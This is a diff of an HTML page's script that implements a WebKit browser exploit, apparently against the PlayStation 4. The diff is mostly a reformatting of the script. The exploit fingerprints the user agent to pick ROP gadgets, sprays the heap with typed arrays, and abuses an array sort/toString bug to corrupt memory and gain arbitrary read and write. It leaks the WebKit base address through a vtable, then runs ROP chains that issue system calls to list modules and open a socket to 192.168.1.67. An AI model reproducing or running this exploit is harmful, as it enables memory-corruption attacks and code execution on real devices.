@@ -7,209 +7,223 @@
 <script src="/scripts/gadgets.js"></script>
 
 <script>
-try {
-    var ua = window.navigator.userAgent;
-    var supportedUAs = Object.getOwnPropertyNames(gadgetMap);
-    for(var i = 0; i < supportedUAs.length; i++) 
-      if(ua.indexOf(supportedUAs[i]) != -1) {
-          gadgets = gadgetMap[supportedUAs[i]];
-      }
-    if(typeof(gadgets) === "undefined") {
-        throw "Your system is not supported.";
-    }
-    
-    debug_log("\r\nEntering exploit\r\n");
-    var spray = new Array(0x1000)
-    for (var i = 0; i < spray.length; i++) {
-        spray[i] = new Uint32Array(0x1A7)
-    }
-
-    var almost_oversize = 0x3000;
-    var foo = new Array(almost_oversize);
-    var normal_length = 0x800;
-    var fu = new Array(normal_length);
-    var o = {};
-    var arrays = new Array(0x4);
-    var buf_addr = undefined;
-    var vtable_ptr = undefined;
-    var webkit_base_addr = undefined;
-    var cbuf = undefined;
-    var rop_buf = undefined;
-    var rop_buf_addr = undefined;
-    var storage = new Storage();
-    var found = false;
-
-    o.toString = function() {
-        foo.push(12345);
-        for (var i = 0; i < arrays.length; ++i) {
-            var bar = Array.prototype.constructor.apply(null, fu);
-            bar[0] = 1
-            bar[1] = 2
-            bar[2] = 3
-            arrays[i] = bar;
+    try {
+        var ua = window.navigator.userAgent;
+        var supportedUAs = Object.getOwnPropertyNames(gadgetMap);
+        for (var i = 0; i < supportedUAs.length; i++)
+            if (ua.indexOf(supportedUAs[i]) != -1) {
+                gadgets = gadgetMap[supportedUAs[i]];
+            }
+        if (typeof(gadgets) === "undefined") {
+            throw "Your system is not supported.";
         }
-        return "";
-    }
 
-    foo[0] = o;
-
-    len = u2d(0x80000000, 0x80000000);
-    for (var i = 1; i < foo.length; ++i) {
-        foo[i] = len
-    }
-
-    foo.sort();
-    o.toString = function() {};
-
-    var u32buffer = new Array(0x100)
-    for (var i = 0; i < 0x100; i++) {
-        var v = new Uint32Array(0x13AC)
-        for (var j = 0; j < v.length; j++) {
-            if (j % 2 == 1)
-                v[j] = 0x41414141
-            else
-                v[j] = j;
+        var spray = new Array(0x1000)
+        for (var i = 0; i < spray.length; i++) {
+            spray[i] = new Uint32Array(0x1A7)
         }
-        u32buffer[i] = v
-    }
 
-    arr = arrays[1]
+        var almost_oversize = 0x3000;
+        var foo = new Array(almost_oversize);
+        var normal_length = 0x800;
+        var fu = new Array(normal_length);
+        var o = {};
+        var arrays = new Array(0x4);
+        var buf_addr = undefined;
+        var vtable_ptr = undefined;
+        var webkit_base_addr = undefined;
+        var cbuf = undefined;
+        var rop_buf = undefined;
+        var rop_buf_addr = undefined;
+        var storage = new Storage();
+        var found = false;
 
-    debug_log("Modified arr length = 0x" + arr.length.toString(16))
-    var start_offset = 0x2F000
-    var offset = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * -50)]).low
-    var offset2 = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * 20)]).low
-    var index = 0;
-    for (var i = 48; i < 60; i++) {
-        var val = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * i) - offset / 2 - 1]).hi
-        if (val == 0xbadaeef7) {
-            found = true;
-            debug_log("Found ArrayBufferView in memory!")
-            debug_log('Modified index is ' + i)
-            index = i;
-            break
+        o.toString = function() {
+            foo.push(12345);
+            for (var i = 0; i < arrays.length; ++i) {
+                var bar = Array.prototype.constructor.apply(null, fu);
+                bar[0] = 1
+                bar[1] = 2
+                bar[2] = 3
+                arrays[i] = bar;
+            }
+            return "";
         }
-    }
-    
-    if(!found) {
-      throw "Did not find ArrayBufferView in memory.";
-    }
 
-    // Modify an ArrayBufferView object size,
-    // and make its buffer point to its ArrayBuffer field.
-    arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 7] = u2d(0x80000000, 0xbadbeef7);
-    arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 2] = arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 4]
+        foo[0] = o;
 
-    found = false;
-    for (var i = 0; i < u32buffer.length; i++) {
-        if (u32buffer[i].length != 0x13AC) {
-            // Modify the ArrayBuffer so it is larger
-            // and make it so it's m_data pointer points to the ArrayBufferViews
-            debug_log("Found modified ArrayBufferView!")
-            found = true
-            buf_addr = new dcodeIO.Long(u32buffer[i][2], u32buffer[i][3], true)
-            u32buffer[i][4] = (0x60000 * 4)
-            u32buffer[i][2] = u32buffer[i][6]
-            u32buffer[i][3] = u32buffer[i][7]
-            break;
+        len = u2d(0x80000000, 0x80000000);
+        for (var i = 1; i < foo.length; ++i) {
+            foo[i] = len
         }
-    }
-    
-    if(!found) {
-      throw "Did not find ArrayBufferView in memory.";
-    }
 
-    found = false;
-    // Find the modified ArrayBuffer and create our own Uint32Array from it
-    for (var i = 0; i < u32buffer[i].length; i++) {
-        if (u32buffer[i].buffer.byteLength != 0x4eb0) {
-            found = true;
-            debug_log("Found modified ArrayBuffer!")
-            cbuf = new Uint32Array(u32buffer[i].buffer)
-            break;
+        foo.sort();
+        o.toString = function() {};
+
+        var u32buffer = new Array(0x100)
+        for (var i = 0; i < 0x100; i++) {
+            var v = new Uint32Array(0x13AC)
+            for (var j = 0; j < v.length; j++) {
+                if (j % 2 == 1)
+                    v[j] = 0x41414141
+                else
+                    v[j] = j;
+            }
+            u32buffer[i] = v
         }
-    }
-    
-    if(!found) {
-      throw "Did not find ArrayBufferView in memory.";
-    }
 
-    vtable_ptr = new dcodeIO.Long(cbuf[0], cbuf[1], true);
-    webkit_base_addr = vtable_ptr.sub(0x2600d80)
-        // Change the buffer size of the next ArrayBufferView in memory
-    cbuf[0x1e] = 0x600000
+        arr = arrays[1]
 
-    found = false;
-    // Find it, we will use it for ROP
-    for (var i = 0; i < u32buffer[i].length; i++) {
-        if (u32buffer[i].length == 0x600000) {
-            found = true;
-            rop_buf = u32buffer[i]
-            break;
+        debug_log("Modified arr length = 0x" + arr.length.toString(16))
+        var start_offset = 0x2F000
+        var offset = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * -50)]).low
+        var offset2 = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * 20)]).low
+        var index = 0;
+        for (var i = 48; i < 60; i++) {
+            var val = d2u(arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * i) - offset / 2 - 1]).hi
+            if (val == 0xbadaeef7) {
+                found = true;
+                debug_log("Found ArrayBufferView in memory!")
+                debug_log('Modified index is ' + i)
+                index = i;
+                break
+            }
         }
-    }
-    
-    if(!found) {
-      throw "Did not find ArrayBufferView in memory.";
-    }
 
-    // Basically the way the memory will be used is:
-    // (indexed from start of buffer before modification)
-    // (0 - 0x40000) =  used for stack in function calls
-    // (0x40000 - (0x80000 - 0x8)) = where actual ROP will be stored
-    // ((0x80000 - 0x8) - 0x80000 = where we store old rsp value)
-    // (0x80000 - 0xc0000) = data to be stored by the user using the Storage class
+        if (!found) {
+            throw "Did not find ArrayBufferView in memory.";
+        }
 
-    rop_buf_addr = new dcodeIO.Long(cbuf[0x14], cbuf[0x15], true)
+        // Modify an ArrayBufferView object size,
+        // and make its buffer point to its ArrayBuffer field.
+        arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 7] = u2d(0x80000000, 0xbadbeef7);
+        arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 2] = arr[(start_offset) + 0x3000 / 8 + (0x5000 / 8 * index) - offset2 / 2 + 4]
 
-    rop_buf_addr = rop_buf_addr.add(0x10000 * 4)
-    cbuf[0x14] = rop_buf_addr.getLowBitsUnsigned()
-    cbuf[0x15] = rop_buf_addr.getHighBitsUnsigned()
+        found = false;
+        for (var i = 0; i < u32buffer.length; i++) {
+            if (u32buffer[i].length != 0x13AC) {
+                // Modify the ArrayBuffer so it is larger
+                // and make it so it's m_data pointer points to the ArrayBufferViews
+                debug_log("Found modified ArrayBufferView!")
+                found = true
+                buf_addr = new dcodeIO.Long(u32buffer[i][2], u32buffer[i][3], true)
+                u32buffer[i][4] = (0x60000 * 4)
+                u32buffer[i][2] = u32buffer[i][6]
+                u32buffer[i][3] = u32buffer[i][7]
+                break;
+            }
+        }
 
-    storage.set_initial_addr(rop_buf_addr.add(0x10000 * 4))
+        if (!found) {
+            throw "Did not find ArrayBufferView in memory.";
+        }
 
-    debug_log("vtable = 0x" + vtable_ptr.toString(16))
-    debug_log("webkit_base_addr = 0x" + webkit_base_addr.toString(16))
-    debug_log("buffer addr = 0x" + rop_buf_addr.toString(16))
-    
-    debug_log("Starting ROP...")
+        found = false;
+        // Find the modified ArrayBuffer and create our own Uint32Array from it
+        for (var i = 0; i < u32buffer[i].length; i++) {
+            if (u32buffer[i].buffer.byteLength != 0x4eb0) {
+                found = true;
+                debug_log("Found modified ArrayBuffer!")
+                cbuf = new Uint32Array(u32buffer[i].buffer)
+                break;
+            }
+        }
 
-    debug_log('Printing module information...')
-    for (var i = 0; i < 0x100; i++) {
-        var buf = storage.alloc(0x1A8)
+        if (!found) {
+            throw "Did not find ArrayBufferView in memory.";
+        }
+
+        vtable_ptr = new dcodeIO.Long(cbuf[0], cbuf[1], true);
+        webkit_base_addr = vtable_ptr.sub(0x2600d80)
+            // Change the buffer size of the next ArrayBufferView in memory
+        cbuf[0x1e] = 0x600000
+
+        found = false;
+        // Find it, we will use it for ROP
+        for (var i = 0; i < u32buffer[i].length; i++) {
+            if (u32buffer[i].length == 0x600000) {
+                found = true;
+                rop_buf = u32buffer[i]
+                break;
+            }
+        }
+
+        if (!found) {
+            throw "Did not find ArrayBufferView in memory.";
+        }
+
+        // Basically the way the memory will be used is:
+        // (indexed from start of buffer before modification)
+        // (0 - 0x40000) =  used for stack in function calls
+        // (0x40000 - (0x80000 - 0x8)) = where actual ROP will be stored
+        // ((0x80000 - 0x8) - 0x80000 = where we store old rsp value)
+        // (0x80000 - 0xc0000) = data to be stored by the user using the Storage class
+
+        rop_buf_addr = new dcodeIO.Long(cbuf[0x14], cbuf[0x15], true)
+
+        rop_buf_addr = rop_buf_addr.add(0x10000 * 4)
+        cbuf[0x14] = rop_buf_addr.getLowBitsUnsigned()
+        cbuf[0x15] = rop_buf_addr.getHighBitsUnsigned()
+
+        storage.set_initial_addr(rop_buf_addr.add(0x10000 * 4))
+
+        debug_log("vtable = 0x" + vtable_ptr.toString(16))
+        debug_log("webkit_base_addr = 0x" + webkit_base_addr.toString(16))
+        debug_log("buffer addr = 0x" + rop_buf_addr.toString(16))
+
+        debug_log("Starting ROP...")
+
+        debug_log('Printing module information...')
+        for (var i = 0; i < 0x100; i++) {
+            var buf = storage.alloc(0x1A8)
+            var ret = storage.alloc(0x4)
+            write32(buf, 0x1A8)
+            var r = new RopChain();
+            r.syscall(608, i, 0, buf)
+            r.add('pop rdi')
+            r.add(ret)
+            r.add('mov qword ptr [rdi], rax')
+            r.execute()
+            if (read32(ret) != 0)
+                continue;
+            var base = read64(buf.add(0x44 * 4))
+            debug_log('Module name: ' + read_str(buf.add(0x8)))
+            debug_log('Module Index: ' + i.toString(16))
+            debug_log('Module Base: ' + base.toString(16))
+            debug_log('===============')
+            storage.free(0x1A8 + 0x4)
+        }
+
+        r = new RopChain()
         var ret = storage.alloc(0x4)
-        write32(buf, 0x1A8)
-        var r = new RopChain();
-        r.syscall(608, i, 0, buf)
+        var mod_info = storage.alloc(0x40)
+        write32(mod_info, 0x40)
+        r.syscall(572, webkit_base_addr, 0, mod_info, 0x40)
         r.add('pop rdi')
         r.add(ret)
         r.add('mov qword ptr [rdi], rax')
         r.execute()
-        if (read32(ret) != 0)
-            continue;
-        var base = read64(buf.add(0x44 * 4))
-        debug_log('Module name: ' + read_str(buf.add(0x8)))
-        debug_log('Module Index: ' + i.toString(16))
-        debug_log('Module Base: ' + base.toString(16))
-        debug_log('===============')
+        debug_log("return val = " + read32(ret).toString(16))
+        debug_log(read_str(mod_info.add(0x8)))
+        for (var i = 0; i < 0x1A8; i += 4)
+            debug_log(read32(mod_info.add(i)).toString(16))
         storage.free(0x1A8 + 0x4)
+
+        debug_log('Testing sockets...')
+        var s = socket()
+        debug_log('socket() returned 0x' + s.toString(16))
+        var cn = connect_helper(s, '192.168.1.67', 8989)
+        debug_log('connect() returned 0x' + cn.toString(16))
+        var str_to_write = "Hello From a PS4!\n"
+        var addr = storage.alloc(str_to_write.length)
+        write_str(addr, str_to_write)
+        var bytes_written = write(s, addr, str_to_write.length)
+        debug_log('write() returned 0x' + bytes_written.toString(16))
+        storage.free(str_to_write.length)
+
+        debug_log("DONE!")
+    } catch (ex) {
+        document.write("<h1>Error: " + ex + "</h1>");
+        debug_log("!! ERROR: " + ex);
     }
-
-    debug_log('Testing sockets...')
-    var s = socket()
-    debug_log('socket() returned 0x' + s.toString(16))
-    var cn = connect_helper(s, '192.168.1.67', 8989)
-    debug_log('connect() returned 0x' + cn.toString(16))
-    var str_to_write = "Hello From a PS4!\n"
-    var addr = storage.alloc(str_to_write.length)
-    write_str(addr, str_to_write)
-    var bytes_written = write(s, addr, str_to_write.length)
-    debug_log('write() returned 0x' + bytes_written.toString(16))
-    storage.free(str_to_write.length)
-
-    debug_log("DONE!")
-} catch (ex) {
-    document.write("<h1>Error: "+ex+"</h1>");
-    debug_log("!! ERROR: "+ex);
-}
 </script>
